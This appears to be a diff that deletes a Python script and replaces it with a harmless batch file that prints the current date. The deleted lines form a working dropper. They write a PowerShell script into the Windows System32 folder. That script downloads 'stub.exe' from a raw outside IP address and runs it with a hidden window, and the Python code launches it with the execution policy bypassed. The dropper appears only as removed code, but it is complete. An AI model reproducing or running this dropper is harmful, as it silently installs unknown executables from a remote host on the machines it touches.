@@ -1,25 +1,7 @@
-import os
-import subprocess
-
-# PowerShell script content
-powershell_script = """
-$url = "http://162.19.219.101/stub.exe"
-$outputPath = "$env:TEMP\\stub.exe"
-Invoke-WebRequest -Uri $url -OutFile $outputPath
-Start-Process -FilePath $outputPath -WindowStyle Hidden
-Write-Host "File downloaded and executed. Enjoy your potentially malicious software!"
-"""
-
-# Path to save the PowerShell script
-powershell_path = "C:\\Windows\\System32\\download_and_execute.ps1"
-
-# Write the PowerShell script to the file
-with open(powershell_path, "w", encoding="utf-8") as f:
-    f.write(powershell_script)
-
-print(f"PowerShell script created at {powershell_path}")
-
-# Execute the PowerShell script
-subprocess.call(["powershell", "-ExecutionPolicy", "Bypass", "-File", powershell_path])
-
-print("PowerShell script executed.")
+::Hello World !
+@echo OFF
+echo Date : %date%
+echo Day : %date:~0,2%
+echo Month : %date:~3,2%
+echo Year : %date:~6,4%
+pause >nul
